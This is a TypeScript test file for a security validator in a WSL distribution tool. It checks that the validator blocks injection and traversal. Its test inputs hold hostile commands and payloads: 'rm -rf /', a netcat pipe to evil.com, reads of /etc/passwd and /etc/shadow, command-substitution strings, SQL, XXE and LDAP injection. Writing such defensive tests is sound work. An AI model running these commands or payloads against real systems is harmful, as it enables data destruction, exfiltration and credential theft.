/**
 * SecurityValidator Real Tests
 * Tests actual security validation without mocks
 *
 * @author Marcus Johnson, QA Manager
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { SecurityValidator } from '../../../src/security/securityValidator';
import { assertThrowsAsync, assertPerformance } from '../../helpers/assertions';

describe('SecurityValidator - Real Security Tests', () => {
    let validator: SecurityValidator;

    beforeEach(() => {
        // Get fresh instance for each test
        // @ts-ignore - accessing private for testing
        SecurityValidator.instance = undefined;
        validator = SecurityValidator.getInstance();
    });

    afterEach(() => {
        // Clean up
        // @ts-ignore
        SecurityValidator.instance = undefined;
    });

    describe('Command Validation', () => {
        it('should validate safe commands', async () => {
            const safeCommands = [
                { command: 'list', args: ['--list'], timestamp: Date.now() },
                { command: 'create', args: ['test-distro'], timestamp: Date.now() },
                { command: 'export', args: ['Ubuntu', '/tmp/export.tar'], timestamp: Date.now() }
            ];

            for (const cmd of safeCommands) {
                const result = await validator.validateCommand(cmd);
                expect(result.allowed).toBe(true);
                expect(result.reason).toBeUndefined();
            }
        });

        it('should block dangerous command patterns', async () => {
            const dangerousCommands = [
                { command: 'exec', args: ['; rm -rf /'], timestamp: Date.now() },
                { command: 'run', args: ['&& malicious'], timestamp: Date.now() },
                { command: 'eval', args: ['`cat /etc/passwd`'], timestamp: Date.now() },
                { command: 'shell', args: ['| nc evil.com 1234'], timestamp: Date.now() }
            ];

            for (const cmd of dangerousCommands) {
                const result = await validator.validateCommand(cmd);
                expect(result.allowed).toBe(false);
                expect(result.reason).toContain('dangerous');
            }
        });

        it('should detect command injection attempts', async () => {
            const injectionAttempts = [
                ['test;ls'],
                ['test&&whoami'],
                ['test|cat'],
                ['test`id`'],
                ['test$(pwd)'],
                ['test\necho hacked'],
                ['test\r\ndir']
            ];

            for (const args of injectionAttempts) {
                const result = await validator.validateCommand({
                    command: 'create',
                    args,
                    timestamp: Date.now()
                });
                expect(result.allowed).toBe(false);
                expect(result.reason?.toLowerCase()).toContain('injection');
            }
        });
    });

    describe('Rate Limiting', () => {
        it('should enforce rate limits with real timers', async () => {
            // Configure strict rate limit
            const operation = 'test-operation';
            const limit = 3;
            const windowMs = 1000; // 1 second window

            // @ts-ignore - accessing private for testing
            validator.rateLimits.set(operation, { limit, windowMs, requests: [] });

            // Make requests up to limit
            for (let i = 0; i < limit; i++) {
                const result = await validator.validateRateLimit(operation);
                expect(result.allowed).toBe(true);
            }

            // Next request should be blocked
            const blocked = await validator.validateRateLimit(operation);
            expect(blocked.allowed).toBe(false);
            expect(blocked.reason).toContain('rate limit');

            // Wait for window to pass
            await new Promise(resolve => setTimeout(resolve, windowMs + 100));

            // Should be allowed again
            const afterWait = await validator.validateRateLimit(operation);
            expect(afterWait.allowed).toBe(true);
        });

        it('should track operations independently', async () => {
            const op1 = 'operation-1';
            const op2 = 'operation-2';

            // Configure different limits
            // @ts-ignore
            validator.rateLimits.set(op1, { limit: 2, windowMs: 1000, requests: [] });
            // @ts-ignore
            validator.rateLimits.set(op2, { limit: 3, windowMs: 1000, requests: [] });

            // Use up op1 limit
            await validator.validateRateLimit(op1);
            await validator.validateRateLimit(op1);

            // op1 should be blocked
            const op1Blocked = await validator.validateRateLimit(op1);
            expect(op1Blocked.allowed).toBe(false);

            // op2 should still work
            const op2Result = await validator.validateRateLimit(op2);
            expect(op2Result.allowed).toBe(true);
        });

        it('should clean up old requests', async () => {
            const operation = 'cleanup-test';
            const windowMs = 500;

            // @ts-ignore
            validator.rateLimits.set(operation, { limit: 2, windowMs, requests: [] });

            // Make a request
            await validator.validateRateLimit(operation);

            // Wait for window to pass
            await new Promise(resolve => setTimeout(resolve, windowMs + 100));

            // Make another request - old one should be cleaned up
            const result = await validator.validateRateLimit(operation);
            expect(result.allowed).toBe(true);

            // Check that old request was removed
            // @ts-ignore
            const rateLimit = validator.rateLimits.get(operation);
            expect(rateLimit.requests.length).toBe(1);
        });
    });

    describe('Path Validation', () => {
        it('should validate safe paths', async () => {
            const safePaths = [
                '/tmp/test.tar',
                'C:\\temp\\export.tar',
                './exports/distro.tar',
                'distributions/ubuntu.tar'
            ];

            for (const path of safePaths) {
                const result = await validator.validatePath(path);
                expect(result.allowed).toBe(true);
            }
        });

        it('should block path traversal attempts', async () => {
            const traversalPaths = [
                '../../../etc/passwd',
                '..\\..\\..\\Windows\\System32',
                '/etc/shadow',
                'C:\\Windows\\System32\\config\\sam',
                '\\\\server\\share\\sensitive',
                'file:///etc/passwd'
            ];

            for (const path of traversalPaths) {
                const result = await validator.validatePath(path);
                expect(result.allowed).toBe(false);
                expect(result.reason?.toLowerCase()).toContain('traversal');
            }
        });

        it('should block paths with null bytes', async () => {
            const nullPaths = [
                'test\0.tar',
                '/tmp/file\x00.txt',
                'C:\\temp\0\\file.tar'
            ];

            for (const path of nullPaths) {
                const result = await validator.validatePath(path);
                expect(result.allowed).toBe(false);
            }
        });
    });

    describe('Distribution Name Validation', () => {
        it('should validate safe distribution names', async () => {
            const safeNames = [
                'Ubuntu-20.04',
                'test_distro',
                'my-wsl-instance',
                'Alpine3.15',
                'Dev-Environment'
            ];

            for (const name of safeNames) {
                const result = await validator.validateDistributionName(name);
                expect(result.allowed).toBe(true);
            }
        });

        it('should block dangerous characters in names', async () => {
            const dangerousNames = [
                'test;rm -rf /',
                'test&&echo hacked',
                'test|cat',
                'test`whoami`',
                'test$(id)',
                'test\nnewline',
                'test\r\ncarriage',
                '../test',
                '..\\test',
                'test\0null'
            ];

            for (const name of dangerousNames) {
                const result = await validator.validateDistributionName(name);
                expect(result.allowed).toBe(false);
            }
        });

        it('should enforce name length limits', async () => {
            // Too short
            let result = await validator.validateDistributionName('');
            expect(result.allowed).toBe(false);

            result = await validator.validateDistributionName('a');
            expect(result.allowed).toBe(false);

            // Too long
            const longName = 'a'.repeat(256);
            result = await validator.validateDistributionName(longName);
            expect(result.allowed).toBe(false);

            // Just right
            result = await validator.validateDistributionName('valid-name');
            expect(result.allowed).toBe(true);
        });
    });

    describe('Operation Permissions', () => {
        it('should check operation permissions', async () => {
            // Test restricted operations
            const restrictedOps = ['delete', 'unregister', 'terminate'];

            for (const op of restrictedOps) {
                const result = await validator.checkPermission(op, {
                    requireConfirmation: true
                });

                // Without confirmation, should require it
                expect(result.allowed).toBe(false);
                expect(result.reason).toContain('confirmation');
            }
        });

        it('should allow operations with proper context', async () => {
            const result = await validator.checkPermission('delete', {
                requireConfirmation: true,
                confirmed: true
            });

            expect(result.allowed).toBe(true);
        });
    });

    describe('Security Event Logging', () => {
        it('should log security events', async () => {
            const events: any[] = [];

            // @ts-ignore - accessing private for testing
            const originalLog = validator.logSecurityEvent;
            // @ts-ignore
            validator.logSecurityEvent = (event: any) => {
                events.push(event);
            };

            // Trigger security event
            await validator.validateCommand({
                command: 'exec',
                args: ['; malicious'],
                timestamp: Date.now()
            });

            // Check event was logged
            expect(events.length).toBeGreaterThan(0);
            expect(events[0].type).toBe('COMMAND_BLOCKED');

            // Restore
            // @ts-ignore
            validator.logSecurityEvent = originalLog;
        });
    });

    describe('Performance', () => {
        it('should validate commands quickly', async () => {
            const command = {
                command: 'list',
                args: ['--list'],
                timestamp: Date.now()
            };

            // Validation should be near-instant (< 50ms)
            await assertPerformance(
                () => validator.validateCommand(command),
                50,
                'Command validation'
            );
        });

        it('should handle concurrent validations', async () => {
            const promises = [];

            // Simulate concurrent requests
            for (let i = 0; i < 100; i++) {
                promises.push(validator.validateCommand({
                    command: 'test',
                    args: [`arg-${i}`],
                    timestamp: Date.now()
                }));
            }

            // All should complete without errors
            const results = await Promise.all(promises);
            expect(results.every(r => r.allowed !== undefined)).toBe(true);
        });
    });

    describe('Real-World Attack Scenarios', () => {
        it('should prevent SQL injection patterns', async () => {
            const sqlInjections = [
                "'; DROP TABLE users; --",
                "1' OR '1'='1",
                "admin'--",
                "' UNION SELECT * FROM passwords"
            ];

            for (const injection of sqlInjections) {
                const result = await validator.validateCommand({
                    command: 'query',
                    args: [injection],
                    timestamp: Date.now()
                });
                expect(result.allowed).toBe(false);
            }
        });

        it('should prevent XML/XXE injection', async () => {
            const xxePayloads = [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]>'
            ];

            for (const payload of xxePayloads) {
                const result = await validator.validateCommand({
                    command: 'parse',
                    args: [payload],
                    timestamp: Date.now()
                });
                expect(result.allowed).toBe(false);
            }
        });

        it('should prevent LDAP injection', async () => {
            const ldapInjections = [
                '*)(uid=*',
                'admin)(|(password=*',
                '*)(objectClass=*'
            ];

            for (const injection of ldapInjections) {
                const result = await validator.validateDistributionName(injection);
                expect(result.allowed).toBe(false);
            }
        });
    });
});